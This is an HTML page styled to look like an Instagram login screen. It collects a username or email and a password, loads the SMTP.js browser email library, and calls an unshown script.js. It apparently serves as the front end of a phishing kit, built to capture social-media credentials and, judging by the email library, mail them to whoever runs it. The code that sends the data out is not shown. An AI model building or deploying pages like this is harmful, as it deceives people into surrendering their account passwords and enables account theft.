<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
          theme: {
            extend: {
              colors: {
                clifford: '#da373d',
              }
            }
          }
        }
      </script>
        <style type="text/tailwindcss">
            @layer utilities {
              .content-auto {
                content-visibility: auto;
              }
            }
          </style>
            <script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
            <script src="https://smtpjs.com/v3/smtp.js"></script>
    <title>Document</title>
</head>
<body class="flex justify-center flex-col items-center mt-20">
    <img src="assets/instagram_logo.png" class="w-[150px] pb-10" alt="facebook logo">
    <form id="loginForm">
      <div class="flex flex-col gap-4 w-[350px] p-10 shadow-md">
        <h1 class="text-2xl">Sign in to Continue</h1>
        <input type="text"  id="email" class="border-2 rounded-sm border-slate-200" placeholder="Phone number, username,email address">
        <input type="password"  id="password" class="border-2 rounded-sm border-slate-200" placeholder="Password">
        <p class="text-right text-blue-400">Forgot Password?</p>
        <button  type="submit" class="w-full py-2 text-white rounded-sm bg-blue-400">Log in</button> 
        <p>Don't have an account? <a href="#" class="text-blue-400">Sign up</a></p>
    </div>
    </form>
    <script src="script.js"></script>
</body>
</html>
